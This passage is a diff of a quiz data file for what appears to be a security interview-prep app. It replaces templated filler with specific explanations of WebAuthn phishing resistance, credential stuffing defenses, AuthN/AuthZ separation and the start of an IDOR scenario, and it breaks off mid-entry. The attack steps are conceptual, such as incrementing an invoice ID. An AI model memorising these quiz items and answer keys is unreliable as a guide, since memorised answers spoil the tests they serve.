-        "Signature rejected: Origin mismatch!",
-        "Rely on frontend UI obfuscation and hidden buttons",
-        "Disable all CORS headers globally",
-        "Store all sensitive session secrets in localStorage"
+        "Because WebAuthn binds the signature cryptographically to the browser's actual TLS origin (rpId); hardware authenticators will never sign credentials for an attacker's reverse-proxy domain",
+        "Because WebAuthn requires users to type their mother's maiden name during biometric authentication",
+        "Because WebAuthn requires 128-digit numeric passwords sent over cellular 5G networks",
+        "Because WebAuthn disables all internet traffic while authentication is running"
       ],
       "correctIndex": 0,
-      "explanation": "Always mandate WebAuthn / FIDO2 security keys for high-privilege administrators, cloud infrastructure engineers, and critical systems where credential phishing is a primary attack vector."
+      "explanation": "Reverse-proxy phishing tools (like Evilginx) can easily intercept and relay 6-digit TOTP codes or SMS tokens. WebAuthn is immune because the browser supplies the real domain origin to the authenticator; the authenticator will refuse to sign if the origin does not match the registered Relying Party ID."
     }
   },
   {
@@ -2226,144 +2250,144 @@ export const questionsData: QuestionData[] = [
     "steps": [
       {
         "id": 1,
-        "label": "Distributed Stuffing Wave",
-        "from": "botnet",
-        "to": "waf_limiter",
-        "packet": "POST /login (1,000 requests/sec across rotating proxy IPs)",
-        "caption": "Step 1: Attacker uses automated bots and rotating residential proxy pools to test millions of leaked username/password combos.",
+        "label": "Distributed Credential Stuffing Surge",
+        "from": "attacker",
+        "to": "gateway",
+        "packet": "POST /auth/login (10,000 requests across 2,000 residential proxy IPs)",
+        "caption": "Step 1: Attackers use botnets and leaked database combo lists (username:password) across residential IPs to bypass naive IP rate limits.",
         "status": "attack",
-        "whatIsHappeningTitle": "Step 1: Distributed Stuffing Wave",
-        "whatIsHappeningText": "Step 1: Attacker uses automated bots and rotating residential proxy pools to test millions of leaked username/password combos.",
+        "whatIsHappeningTitle": "Step 1: Credential Stuffing Surge",
+        "whatIsHappeningText": "Step 1: Attackers use botnets and leaked database combo lists (username:password) across residential IPs to bypass naive IP rate limits.",
         "terms": [
           {
-            "term": "Origin",
-            "definition": "The unique tuple of protocol scheme, hostname, and port number."
+            "term": "Credential Stuffing",
+            "definition": "Automated injection of breached username/password pairs across multiple sites, exploiting human password reuse."
           },
           {
-            "term": "SOP Boundary",
-            "definition": "Browser security rule isolating DOM and network access across different origins."
+            "term": "Residential Proxy Network",
+            "definition": "A network of compromised residential IP addresses used by botnets to disperse requests and evade IP rate limiting."
           }
         ],
-        "deepExplanation": "Step 1 begins with the client issuing the baseline communication packet. The network transport layer establishes TLS 1.3 mutual parameters and delivers the initial payload to the entrypoint perimeter.",
-        "whyItMatters": "Establishes a hardened encryption baseline before any sensitive security claims or tokens are exchanged.",
-        "securityVerdict": "Secure transport layer guarantees confidentiality in transit.",
+        "deepExplanation": "Adversaries obtain billions of breached credentials from third-party leaks. Using automated tools (e.g. OpenBullet), they replay these pairs against login endpoints. Because attackers route traffic through rotating residential proxy IPs (1-2 attempts per IP), naive per-IP rate limiting (e.g. max 10 requests/minute per IP) fails completely.",
+        "whyItMatters": "Accounts with reused passwords will be silently compromised unless multi-layered behavioral defenses are deployed.",
+        "securityVerdict": "Automated stuffing attack evades traditional single-IP threshold filters.",
         "telemetry": {
-          "protocol": "TLS 1.3 / HTTP Protocol Stack",
-          "method": "Client Request Initiation",
+          "protocol": "Distributed Botnet Traffic",
+          "method": "POST /api/v1/auth/login",
           "headers": [
-            "Host: api.brute.io",
-            "User-Agent: EnterpriseSec-Agent/4.2",
-            "Sec-Fetch-Mode: cors"
+            "X-Forwarded-For: 203.0.113.84, 198.51.100.12, ...",
+            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
           ],
-          "payloadPreview": "{ \"context\": \"initial_handshake\", \"target\": \"WAF / Rate Limiter\" }",
-          "securityAction": "Client establishes encrypted TLS tunnel and initiates protocol handshake to WAF / Rate Limiter.",
-          "statusBadge": "INITIALIZED"
+          "payloadPreview": "High-volume login attempts with rotating IPs. Unique IPs: 2,410. Target accounts: 10,000.",
+          "securityAction": "WAF detects abnormal global login velocity spike exceeding baseline standard deviation.",
+          "statusBadge": "ANOMALY DETECTED"
         }
       },
       {
         "id": 2,
-        "label": "IP & Account Rate Limiting",
-        "from": "waf_limiter",
-        "to": "botnet",
-        "packet": "HTTP 429 Too Many Requests (Sliding Window)",
-        "caption": "Step 2: WAF applies sliding-window rate limiting per IP, per subnet, and per target username to throttle automated bursts.",
+        "label": "Dual-Key Sliding Window Limiting (IP + Account)",
+        "from": "gateway",
+        "to": "redis",
+        "packet": "Redis Check: INCR login:ip:203.0.113.84 & INCR login:account:alice@corp.com",
+        "caption": "Step 2: Rate limit on TWO keys simultaneously: per IP address AND per targeted account username to catch distributed attacks.",
         "status": "defense",
-        "whatIsHappeningTitle": "Step 2: IP & Account Rate Limiting",
-        "whatIsHappeningText": "Step 2: WAF applies sliding-window rate limiting per IP, per subnet, and per target username to throttle automated bursts.",
+        "whatIsHappeningTitle": "Step 2: Dual-Key Sliding Window Limiting",
+        "whatIsHappeningText": "Step 2: Rate limit on TWO keys simultaneously: per IP address AND per targeted account username to catch distributed attacks.",
         "terms": [
           {
-            "term": "Preflight (OPTIONS)",
-            "definition": "An automatic HTTP request verifying whether cross-origin methods/headers are permitted."
+            "term": "Dual-Key Rate Limiting",
+            "definition": "Tracking velocity counters on both source IP and destination user identity to detect distributed single-account targeting."
           },
           {
-            "term": "CORS Headers",
-            "definition": "Response headers informing the browser if response reading is permitted."
+            "term": "Sliding Window Counter",
+            "definition": "A rate-limiting algorithm using Redis sorted sets (ZADD/ZREMRANGEBYSCORE) for smooth, boundary-attack-resistant limiting."
           }
         ],
-        "deepExplanation": "In Step 2, the intermediary security layer intercepts the packet. It inspects parameters against policy definitions, decodes headers, evaluates rate limits, and validates compliance with security RFCs.",
-        "whyItMatters": "Catches malformed payloads, injection vectors, and unauthorized origin traffic at the outer perimeter.",
-        "securityVerdict": "Perimeter enforcement prevents unauthorized computational load on backend servers.",
+        "deepExplanation": "To counter residential botnets, the API gateway enforces dual-key limiting: 1) Source IP threshold (e.g. max 5 failed attempts per IP per 10 minutes), AND 2) Target account threshold (e.g. max 5 failed attempts across ANY IP for 'alice@corp.com' per 15 minutes). When the account counter triggers, the system initiates defensive step-up measures.",
+        "whyItMatters": "Stops distributed botnets from brute-forcing a specific target user across thousands of distinct proxy IPs.",
+        "securityVerdict": "Identity-aware rate limiting throttles distributed credential stuffing.",
         "telemetry": {
-          "protocol": "Security Inspection Engine",
-          "method": "Boundary Security Assessment",
+          "protocol": "Redis Sliding Window Limiter",
+          "method": "ZADD & ZCOUNT login:target:alice@corp.com",
           "headers": [
-            "X-Forwarded-For: 198.51.100.24",
-            "X-Security-Policy: Strict-Enforce"
+            "Limiter-Key-1: login:ip:203.0.113.84 (Count: 2/5)",
+            "Limiter-Key-2: login:user:alice@corp.com (Count: 6/5 - EXCEEDED)"
           ],
-          "payloadPreview": "{ \"threat_score\": 0.02, \"rate_limit_tokens\": 98, \"status\": \"inspected\" }",
-          "securityAction": "Intermediary proxy WAF / Rate Limiter validates protocol parameters and inspects request semantics.",
-          "statusBadge": "INSPECTED"
+          "payloadPreview": "Account-level threshold breached: 6 failed attempts for alice@corp.com across 6 IPs.",
+          "securityAction": "Gateway flags account alice@corp.com for stepped-up verification.",
+          "statusBadge": "ACCOUNT THROTTLED"
         }
       },
       {
         "id": 3,
-        "label": "Pwned Password Verification",
-        "from": "waf_limiter",
-        "to": "hibp_checker",
-        "packet": "k-Anonymity SHA-1 prefix check (HIBP API)",
-        "caption": "Step 3: Server checks passwords against known breach corpuses during registration/login using k-anonymity without revealing the user's full hash.",
+        "label": "Adaptive Step-Up & CAPTCHA Enforcement",
+        "from": "gateway",
+        "to": "attacker",
+        "packet": "HTTP 429 Too Many Requests OR Invisible CAPTCHA (Cloudflare Turnstile)",
+        "caption": "Step 3: Suspect callers are served friction challenges (Turnstile / reCAPTCHA v3) and password resets for known breached hashes.",
         "status": "defense",
-        "whatIsHappeningTitle": "Step 3: Pwned Password Verification",
-        "whatIsHappeningText": "Step 3: Server checks passwords against known breach corpuses during registration/login using k-anonymity without revealing the user's full hash.",
+        "whatIsHappeningTitle": "Step 3: Adaptive Step-Up & CAPTCHA",
+        "whatIsHappeningText": "Step 3: Suspect callers are served friction challenges (Turnstile / reCAPTCHA v3) and password resets for known breached hashes.",
         "terms": [
           {
-            "term": "Authorization Check",
-            "definition": "Validating permission scopes and roles before granting resource access."
+            "term": "Adaptive Step-Up Authentication",
+            "definition": "Dynamically injecting friction (CAPTCHA, MFA prompt, email confirmation) only when risk scores exceed safe thresholds."
           },
           {
-            "term": "Payload Security",
-            "definition": "Ensuring data transmission integrity and confidentiality over HTTPS."
+            "term": "HTTP 429 (RFC 6585)",
+            "definition": "Status code 'Too Many Requests' indicating the user has sent too many requests in a given amount of time."
           }
         ],
-        "deepExplanation": "Step 3 represents backend core execution. Identity claims, digital signatures, or authorization scopes are cryptographically asserted and persisted to the audit trail before operations proceed.",
-        "whyItMatters": "Guarantees zero-trust principle: never trust the perimeter alone; always verify identity and intent.",
-        "securityVerdict": "Cryptographic assertion ensures tamper-proof verification.",
+        "deepExplanation": "Rather than locking accounts outright (which creates a Denial-of-Service vector where attackers lock out legitimate users), the system dynamically challenges callers: it injects an invisible Turnstile/reCAPTCHA token requirement, enforces exponential backoff delays, and cross-references submitted passwords against HaveIBeenPwned's k-Anonymity breach API.",
+        "whyItMatters": "Breaks automated bot scripts economically by forcing high-cost CAPTCHA solving without impacting genuine users.",
+        "securityVerdict": "Adaptive friction halts automated bot traffic while maintaining service availability.",
         "telemetry": {
-          "protocol": "Backend Core Architecture",
-          "method": "Cryptographic & Identity Verification",
+          "protocol": "RFC 6585 / Bot Mitigation",
+          "method": "HTTP/1.1 429 Too Many Requests",
           "headers": [
-            "Authorization: Scope-Validated",
-            "X-Correlation-ID: 7f8a9b-2026"
+            "Retry-After: 900",
+            "X-Challenge-Required: Turnstile",
+            "Content-Type: application/problem+json"
           ],
-          "payloadPreview": "{ \"audit_log\": \"verified\", \"action\": \"Breach Validator\" }",
-          "securityAction": "Backend service Breach Validator enforces zero-trust access control and signs responses.",
-          "statusBadge": "ENFORCED"
+          "payloadPreview": "{\"error\": \"too_many_attempts\", \"retry_after\": 900, \"challenge\": \"turnstile_token_required\"}",
+          "securityAction": "WAF returns 429 with Retry-After header; requires client-side biometric or cryptographic proof-of-work.",
+          "statusBadge": "429 CHALLENGED"
         }
       },
       {
         "id": 4,
         "label": "Interview line",
-        "from": "waf_limiter",
-        "to": "account_shield",
-        "packet": "Step-up MFA & Exponential Backoff",
-        "caption": "Step 4: Interview line: \"Defend against credential stuffing using layered defenses: progressive rate limiting per IP and user account, CAPTCHA challenges on anomalous behavior, breach password checking via k-anonymity, and mandatory MFA.\"",
+        "from": "gateway",
+        "to": "server",
+        "packet": "Defense Suite: Dual-Key Limiting + Exponential Backoff + k-Anonymity Breach Checks",
+        "caption": "Step 4: Interview line: \"Defending against credential stuffing requires multi-layered controls: rate limiting on both IP and account dimensions, progressive delays, invisible CAPTCHA step-ups, and proactive password breach audits via k-Anonymity.\"",
         "status": "defense",
         "isInterviewLine": true,
         "whatIsHappeningTitle": "Step 4: Interview line",
-        "whatIsHappeningText": "Step 4: Interview line: \"Defend against credential stuffing using layered defenses: progressive rate limiting per IP and user account, CAPTCHA challenges on anomalous behavior, breach password checking via k-anonymity, and mandatory MFA.\"",
+        "whatIsHappeningText": "Step 4: Interview line: \"Defending against credential stuffing requires multi-layered controls: rate limiting on both IP and account dimensions, progressive delays, invisible CAPTCHA step-ups, and proactive password breach audits via k-Anonymity.\"",
         "terms": [
           {
-            "term": "Defense In Depth",
-            "definition": "Layering multiple independent security controls to protect against single-point failure."
+            "term": "k-Anonymity Password Checking",
+            "definition": "Querying breach databases (HaveIBeenPwned) using only the first 5 characters of a SHA-1 password hash, never revealing the password."
           },
           {
-            "term": "Interview Verdict",
-            "definition": "The core architecture principle to articulate to the interviewer."
+            "term": "Account Lockout DoS",
+            "definition": "An operational failure where aggressive hard account lockouts allow adversaries to disable entire enterprise user bases."
           }
         ],
-        "deepExplanation": "Step 4 delivers the definitive security outcome. The architecture neutralizes malicious vectors, isolates untrusted actors, and provides tamper-evident proof to client callers and logging systems.",
-        "whyItMatters": "Provides resilient defense-in-depth, ensuring that even if one layer degrades, the core system remains secure.",
-        "securityVerdict": "Senior interview defense formula satisfied.",
+        "deepExplanation": "Senior candidates emphasize avoiding hard account lockouts (which allow attackers to trigger mass DoS by spraying fake attempts). Instead, employ smart mitigation: progressive exponential delays, dual-dimensional Redis sliding window counters, frictionless bot verification, and integration with HaveIBeenPwned's k-Anonymity API upon password creation.",
+        "whyItMatters": "Balances rigorous enterprise credential protection with seamless legitimate user availability.",
+        "securityVerdict": "Comprehensive anti-automation perimeter active.",
         "telemetry": {
-          "protocol": "Defensive Mitigation Layer",
-          "method": "Policy Enforcement / Verdict",
+          "protocol": "Enterprise Identity Protection",
+          "method": "Multi-Tier Mitigation Pipeline",
           "headers": [
-            "X-Protection-Standard: Enterprise-Grade",
-            "Strict-Transport-Security: max-age=63072000"
+            "X-Account-Integrity: Protected",
+            "X-RateLimit-Scope: IP+Username"
           ],
-          "payloadPreview": "{ \"security_outcome\": \"Protected\", \"takeaway\": \"Avoid hard account lockouts because attackers use them to trigger Deni...\" }",
-          "securityAction": "Final defensive control verified: Smart Lockout secured against exploitation.",
-          "statusBadge": "200 PROTECTED"
+          "payloadPreview": "Credential stuffing defense active: 0 unauthorized takeovers during 100k bot wave.",
+          "securityAction": "Bot traffic neutralized via progressive delays and CAPTCHA challenges; zero legitimate account lockouts.",
+          "statusBadge": "DEFENSE IN DEPTH"
         }
       }
     ],
@@ -2401,15 +2425,15 @@ export const questionsData: QuestionData[] = [
     "tier": "Intermediate",
     "interviewTakeaway": "Avoid hard account lockouts because attackers use them to trigger Denial of Service against legitimate users. Instead, use soft progressive delays, CAPTCHA step-up, and out-of-band email alerts.",
     "quiz": {
-      "question": "What is the most effective security control to resolve: \"How do you defend modern authentication systems against Brute-Force and Credential Stuffing attacks?\"?",
+      "question": "Why is rate limiting based strictly on client IP address ineffective at stopping modern Credential Stuffing attacks, and what is the proper defense?",
       "options": [
-        "Step-up MFA & Exponential Backoff",
-        "Rely on frontend UI obfuscation and hidden buttons",
-        "Disable all CORS headers globally",
-        "Store all sensitive session secrets in localStorage"
+        "Attackers use rotating residential botnet proxies (1-2 attempts per IP across thousands of IPs); architectures must rate limit on BOTH IP and target account username simultaneously",
+        "Because IP addresses cannot be parsed from HTTP request headers under modern TCP/IP standards",
+        "Because residential proxy IPs are automatically whitelisted by web application firewalls",
+        "Because rate limiting on IP addresses causes servers to run out of physical disk space"
       ],
       "correctIndex": 0,
-      "explanation": "Avoid hard account lockouts because attackers use them to trigger Denial of Service against legitimate users. Instead, use soft progressive delays, CAPTCHA step-up, and out-of-band email alerts."
+      "explanation": "Botnets distribute millions of login attempts across tens of thousands of rotating residential proxy IPs, keeping per-IP traffic below standard thresholds. Defenses must track velocity on both IP and targeted username (dual-key limiting), combined with CAPTCHA step-up and breach list monitoring."
     }
   },
   {
@@ -2447,144 +2471,143 @@ export const questionsData: QuestionData[] = [
     "steps": [
       {
         "id": 1,
-        "label": "Identity Verification (AuthN)",
-        "from": "user_req",
-        "to": "authn_idp",
-        "packet": "Verify Password / Passkey / OIDC Token",
-        "caption": "Step 1: Authentication establishes identity: \"Who is making the request?\" Validates cryptographic credentials and returns verified subject claims.",
+        "label": "Authentication Phase (Identity Verification)",
+        "from": "client",
+        "to": "idp",
+        "packet": "POST /auth/token (Validate Credentials / WebAuthn / MFA -> Issue Identity)",
+        "caption": "Step 1: AuthN answers 'Who are you?': Verifies credentials, computes cryptographic signature, and issues principal identity.",
         "status": "normal",
-        "whatIsHappeningTitle": "Step 1: Identity Verification (AuthN)",
-        "whatIsHappeningText": "Step 1: Authentication establishes identity: \"Who is making the request?\" Validates cryptographic credentials and returns verified subject claims.",
+        "whatIsHappeningTitle": "Step 1: Authentication Phase",
+        "whatIsHappeningText": "Step 1: AuthN answers 'Who are you?': Verifies credentials, computes cryptographic signature, and issues principal identity.",
         "terms": [
           {
-            "term": "Origin",
-            "definition": "The unique tuple of protocol scheme, hostname, and port number."
+            "term": "Authentication (AuthN)",
+            "definition": "The mechanism establishing and verifying the genuine identity of an entity (e.g. via passwords, passkeys, or certificates)."
           },
           {
-            "term": "SOP Boundary",
-            "definition": "Browser security rule isolating DOM and network access across different origins."
+            "term": "Principal / Subject (sub)",
+            "definition": "The authenticated unique identity identifier asserted within a security context."
           }
         ],
-        "deepExplanation": "Step 1 begins with the client issuing the baseline communication packet. The network transport layer establishes TLS 1.3 mutual parameters and delivers the initial payload to the entrypoint perimeter.",
-        "whyItMatters": "Establishes a hardened encryption baseline before any sensitive security claims or tokens are exchanged.",
-        "securityVerdict": "Secure transport layer guarantees confidentiality in transit.",
+        "deepExplanation": "In the Authentication (AuthN) phase, the Identity Provider (IdP) validates proof of identity (passwords against Argon2id hashes, WebAuthn assertions, or mTLS certificates). Once validated, the IdP binds the user's canonical identity ('sub: usr_892') into a cryptographic session or signed JWT.",
+        "whyItMatters": "Establishes trusted identity before any access rights can be evaluated.",
+        "securityVerdict": "Identity proven and established in cryptographic security context.",
         "telemetry": {
-          "protocol": "TLS 1.3 / HTTP Protocol Stack",
-          "method": "Client Request Initiation",
+          "protocol": "OIDC / OAuth 2.0 AuthN",
+          "method": "POST /oauth/v2/token",
           "headers": [
-            "Host: api.authentication.io",
-            "User-Agent: EnterpriseSec-Agent/4.2",
-            "Sec-Fetch-Mode: cors"
+            "Content-Type: application/x-www-form-urlencoded",
+            "Host: auth.enterprise.com"
           ],
-          "payloadPreview": "{ \"context\": \"initial_handshake\", \"target\": \"AuthN Service (IdP)\" }",
-          "securityAction": "Client establishes encrypted TLS tunnel and initiates protocol handshake to AuthN Service (IdP).",
-          "statusBadge": "INITIALIZED"
+          "payloadPreview": "grant_type=authorization_code&code=splat_4821&code_verifier=...",
+          "securityAction": "IdP validates authorization code and PKCE verifier; issues signed ID token asserting user_id usr_892.",
+          "statusBadge": "AUTHN COMPLETE"
         }
       },
       {
         "id": 2,
-        "label": "Policy Enforcement (AuthZ)",
-        "from": "authn_idp",
-        "to": "pep_gateway",
-        "packet": "Subject: \"Alice\", Action: \"DELETE\", Resource: \"Doc_42\"",
-        "caption": "Step 2: Authorization establishes permissions: \"Is Alice allowed to delete Doc_42?\" The PEP intercepts the request and queries the decision engine.",
-        "status": "normal",
-        "whatIsHappeningTitle": "Step 2: Policy Enforcement (AuthZ)",
-        "whatIsHappeningText": "Step 2: Authorization establishes permissions: \"Is Alice allowed to delete Doc_42?\" The PEP intercepts the request and queries the decision engine.",
+        "label": "Authorization Phase (Policy Decision Point)",
+        "from": "client",
+        "to": "pdp",
+        "packet": "GET /api/v1/payroll/executives (Bearer JWT attached)",
+        "caption": "Step 2: AuthZ answers 'What can you do?': The Policy Decision Point evaluates roles, attributes, and resource boundaries.",
+        "status": "defense",
+        "whatIsHappeningTitle": "Step 2: Authorization Phase",
+        "whatIsHappeningText": "Step 2: AuthZ answers 'What can you do?': The Policy Decision Point evaluates roles, attributes, and resource boundaries.",
         "terms": [
           {
-            "term": "Preflight (OPTIONS)",
-            "definition": "An automatic HTTP request verifying whether cross-origin methods/headers are permitted."
+            "term": "Authorization (AuthZ)",
+            "definition": "Determining whether an already-authenticated principal is permitted to execute an action on a specific resource."
           },
           {
-            "term": "CORS Headers",
-            "definition": "Response headers informing the browser if response reading is permitted."
+            "term": "PDP (Policy Decision Point)",
+            "definition": "The engine (e.g. Open Policy Agent / AWS Cedar) that evaluates access rules and returns an ALLOW or DENY decision."
           }
         ],
-        "deepExplanation": "In Step 2, the intermediary security layer intercepts the packet. It inspects parameters against policy definitions, decodes headers, evaluates rate limits, and validates compliance with security RFCs.",
-        "whyItMatters": "Catches malformed payloads, injection vectors, and unauthorized origin traffic at the outer perimeter.",
-        "securityVerdict": "Perimeter enforcement prevents unauthorized computational load on backend servers.",
+        "deepExplanation": "With identity established, the request reaches the Policy Decision Point (PDP). The PDP evaluates the principal's roles, scopes ('read:payroll'), resource attributes, and context (time, IP, device security posture) against formal authorization policies.",
+        "whyItMatters": "Decouples access control policies from core application business logic.",
+        "securityVerdict": "Granular authorization evaluated independently from authentication transport.",
         "telemetry": {
-          "protocol": "Security Inspection Engine",
-          "method": "Boundary Security Assessment",
+          "protocol": "XACML / Open Policy Agent (OPA)",
+          "method": "POST /v1/data/authz/allow",
           "headers": [
-            "X-Forwarded-For: 198.51.100.24",
-            "X-Security-Policy: Strict-Enforce"
+            "Content-Type: application/json",
+            "X-Caller-ID: usr_892"
           ],
-          "payloadPreview": "{ \"threat_score\": 0.02, \"rate_limit_tokens\": 98, \"status\": \"inspected\" }",
-          "securityAction": "Intermediary proxy AuthN Service (IdP) validates protocol parameters and inspects request semantics.",
-          "statusBadge": "INSPECTED"
+          "payloadPreview": "Input: { \"user\": \"usr_892\", \"role\": \"accountant\", \"action\": \"read\", \"resource\": \"payroll/executives\" }",
+          "securityAction": "Policy engine checks rule: accountants can read staff payroll, but executives require 'executive_payroll' grant.",
+          "statusBadge": "POLICY EVALUATION"
         }
       },
       {
         "id": 3,
-        "label": "Policy Evaluation (PDP)",
-        "from": "pep_gateway",
-        "to": "pdp_engine",
-        "packet": "Evaluate ABAC Policy (Tenant + Role + Resource Owner)",
-        "caption": "Step 3: Centralized Policy Decision Point (e.g. Open Policy Agent) evaluates attributes and returns Allow or Deny.",
+        "label": "Enforcement Result (Allow vs Deny)",
+        "from": "pdp",
+        "to": "pep",
+        "packet": "Policy Decision: DENY (Missing 'exec_payroll_read' privilege)",
+        "caption": "Step 3: The Policy Enforcement Point enforces the decision, blocking unauthorized access and returning HTTP 403 Forbidden.",
         "status": "defense",
-        "whatIsHappeningTitle": "Step 3: Policy Evaluation (PDP)",
-        "whatIsHappeningText": "Step 3: Centralized Policy Decision Point (e.g. Open Policy Agent) evaluates attributes and returns Allow or Deny.",
+        "whatIsHappeningTitle": "Step 3: Enforcement Result",
+        "whatIsHappeningText": "Step 3: The Policy Enforcement Point enforces the decision, blocking unauthorized access and returning HTTP 403 Forbidden.",
         "terms": [
           {
-            "term": "Authorization Check",
-            "definition": "Validating permission scopes and roles before granting resource access."
+            "term": "PEP (Policy Enforcement Point)",
+            "definition": "The gateway or middleware component that executes the PDP's decision by permitting or aborting the request."
           },
           {
-            "term": "Payload Security",
-            "definition": "Ensuring data transmission integrity and confidentiality over HTTPS."
+            "term": "HTTP 403 Forbidden",
+            "definition": "The standard response for an authenticated user who lacks permission for the target resource."
           }
         ],
-        "deepExplanation": "Step 3 represents backend core execution. Identity claims, digital signatures, or authorization scopes are cryptographically asserted and persisted to the audit trail before operations proceed.",
-        "whyItMatters": "Guarantees zero-trust principle: never trust the perimeter alone; always verify identity and intent.",
-        "securityVerdict": "Cryptographic assertion ensures tamper-proof verification.",
+        "deepExplanation": "The PDP returns decision=DENY to the Policy Enforcement Point (PEP). The PEP immediately halts request execution before it reaches the backend database. It logs an authorization failure audit event and returns an HTTP 403 Forbidden response to the client.",
+        "whyItMatters": "Guarantees that unauthorized requests are terminated at the perimeter before touching database records.",
+        "securityVerdict": "Zero-trust policy enforcement protects confidential executive payroll data.",
         "telemetry": {
-          "protocol": "Backend Core Architecture",
-          "method": "Cryptographic & Identity Verification",
+          "protocol": "RFC 9110 HTTP/2 Status",
+          "method": "HTTP/1.1 403 Forbidden",
           "headers": [
-            "Authorization: Scope-Validated",
-            "X-Correlation-ID: 7f8a9b-2026"
+            "Content-Type: application/problem+json",
+            "X-Policy-Decision: DENY"
           ],
-          "payloadPreview": "{ \"audit_log\": \"verified\", \"action\": \"Policy Enforcer (PEP)\" }",
-          "securityAction": "Backend service Policy Enforcer (PEP) enforces zero-trust access control and signs responses.",
-          "statusBadge": "ENFORCED"
+          "payloadPreview": "{\"error\": \"forbidden\", \"detail\": \"User usr_892 lacks 'exec_payroll_read' privilege\"}",
+          "securityAction": "PEP intercepts denied decision; aborts database query and logs security audit trail.",
+          "statusBadge": "ACCESS DENIED"
         }
       },
       {
         "id": 4,
         "label": "Interview line",
-        "from": "pdp_engine",
-        "to": "pep_gateway",
-        "packet": "Enforce: Allow / Deny (403 Forbidden)",
-        "caption": "Step 4: Interview line: \"Authentication verifies who you are; Authorization decides what you can do — robust architectures separate Policy Enforcement Points (PEP) from Policy Decision Points (PDP).\"",
+        "from": "pdp",
+        "to": "client",
+        "packet": "Architectural Formula: AuthN identifies the caller (401); AuthZ governs resource access (403)",
+        "caption": "Step 4: Interview line: \"Authentication validates identity (who you are); Authorization validates permissions (what you can do). Mixing the two causes catastrophic security bugs like BOLA and broken function-level access.\"",
         "status": "defense",
         "isInterviewLine": true,
         "whatIsHappeningTitle": "Step 4: Interview line",
-        "whatIsHappeningText": "Step 4: Interview line: \"Authentication verifies who you are; Authorization decides what you can do — robust architectures separate Policy Enforcement Points (PEP) from Policy Decision Points (PDP).\"",
+        "whatIsHappeningText": "Step 4: Interview line: \"Authentication validates identity (who you are); Authorization validates permissions (what you can do). Mixing the two causes catastrophic security bugs like BOLA and broken function-level access.\"",
         "terms": [
           {
-            "term": "Defense In Depth",
-            "definition": "Layering multiple independent security controls to protect against single-point failure."
+            "term": "Separation of Concerns",
+            "definition": "Isolating identity verification pipelines from resource authorization policy logic."
           },
           {
-            "term": "Interview Verdict",
-            "definition": "The core architecture principle to articulate to the interviewer."
+            "term": "ABAC (Attribute-Based Access Control)",
+            "definition": "Modern access control evaluating user, resource, and environmental attributes dynamically."
           }
         ],
-        "deepExplanation": "Step 4 delivers the definitive security outcome. The architecture neutralizes malicious vectors, isolates untrusted actors, and provides tamper-evident proof to client callers and logging systems.",
-        "whyItMatters": "Provides resilient defense-in-depth, ensuring that even if one layer degrades, the core system remains secure.",
-        "securityVerdict": "Senior interview defense formula satisfied.",
+        "deepExplanation": "Senior candidates articulate the architectural separation of AuthN and AuthZ: AuthN is centralized at the identity provider using standardized protocols (OIDC, SAML, WebAuthn). AuthZ is distributed across Policy Enforcement Points (PEPs) using fine-grained RBAC or ABAC. Conflating the two (e.g. assuming an authenticated user can access any record) is the root cause of OWASP API #1 (BOLA).",
+        "whyItMatters": "Forms the foundational mental model for designing zero-trust microservice architectures.",
+        "securityVerdict": "Clean architectural separation of identity and access governance enforced.",
         "telemetry": {
-          "protocol": "Defensive Mitigation Layer",
-          "method": "Policy Enforcement / Verdict",
+          "protocol": "Enterprise Security Architecture",
+          "method": "Decoupled Auth Pipeline",
           "headers": [
-            "X-Protection-Standard: Enterprise-Grade",
-            "Strict-Transport-Security: max-age=63072000"
+            "AuthN-Provider: Okta / Keycloak (OIDC)",
+            "AuthZ-Engine: Open Policy Agent (OPA)"
           ],
-          "payloadPreview": "{ \"security_outcome\": \"Protected\", \"takeaway\": \"Always perform authorization checks at the service and data layer. Pas...\" }",
-          "securityAction": "Final defensive control verified: Policy Decision (PDP) secured against exploitation.",
-          "statusBadge": "200 PROTECTED"
+          "payloadPreview": "AuthN: Verified sub=usr_892 via FIDO2. AuthZ: Granular permission evaluated at data layer.",
+          "securityAction": "Decoupled zero-trust architecture satisfies SOC2 / ISO27001 access control controls.",
+          "statusBadge": "ARCHITECTURE VERIFIED"
         }
       }
     ],
@@ -2622,15 +2645,15 @@ export const questionsData: QuestionData[] = [
     "tier": "Intermediate",
     "interviewTakeaway": "Always perform authorization checks at the service and data layer. Passing an authentication check (valid JWT) must never automatically imply permission to access arbitrary resource IDs.",
     "quiz": {
-      "question": "What is the most effective security control to resolve: \"What are the architectural differences between Authentication (AuthN) and Authorization (AuthZ)?\"?",
+      "question": "Which of the following architectural failures represents an Authorization (AuthZ) bug rather than an Authentication (AuthN) bug?",
       "options": [
-        "Enforce: Allow / Deny (403 Forbidden)",
-        "Rely on frontend UI obfuscation and hidden buttons",
-        "Disable all CORS headers globally",
-        "Store all sensitive session secrets in localStorage"
+        "A logged-in normal user successfully modifies another tenant's private billing settings by changing the 'tenant_id' parameter in a PUT request",
+        "A user can log in with a blank password because password validation logic was omitted",
+        "The server accepts expired JWT tokens without checking the 'exp' claim",
+        "An attacker bypasses MFA by intercepting the SMS verification code"
       ],
       "correctIndex": 0,
-      "explanation": "Always perform authorization checks at the service and data layer. Passing an authentication check (valid JWT) must never automatically imply permission to access arbitrary resource IDs."
+      "explanation": "Changing a tenant_id to access another user's data is Broken Object-Level Authorization (BOLA/AuthZ): the user's identity was verified (AuthN passed), but the application failed to verify if the user had authorization to modify that specific object."
     }
   },
   {
@@ -2668,136 +2691,143 @@ export const questionsData: QuestionData[] = [
     "steps": [
       {
         "id": 1,
-        "label": "IDOR Parameter Tampering",
-        "from": "attacker_client",
-        "to": "flawed_api",
-        "packet": "GET /api/invoices/1002 (Victim B's Invoice ID)",
-        "caption": "Step 1: Attacker logs into their own account, inspects their invoice ID (1001), and tampers the URL parameter to request invoice 1002.",
+        "label": "Sequential ID Enumeration Probe",
+        "from": "attacker",
+        "to": "gateway",
+        "packet": "GET /api/v1/invoices/1004 (Attacker owns invoice 1001)",
+        "caption": "Step 1: Attacker identifies sequential integer ID and increments the parameter to probe access to other customers' private records.",
         "status": "attack",
-        "whatIsHappeningTitle": "Step 1: IDOR Parameter Tampering",
-        "whatIsHappeningText": "Step 1: Attacker logs into their own account, inspects their invoice ID (1001), and tampers the URL parameter to request invoice 1002.",
+        "whatIsHappeningTitle": "Step 1: Sequential ID Enumeration Probe",
+        "whatIsHappeningText": "Step 1: Attacker identifies sequential integer ID and increments the parameter to probe access to other customers' private records.",
         "terms": [
           {
-            "term": "BOLA / IDOR",
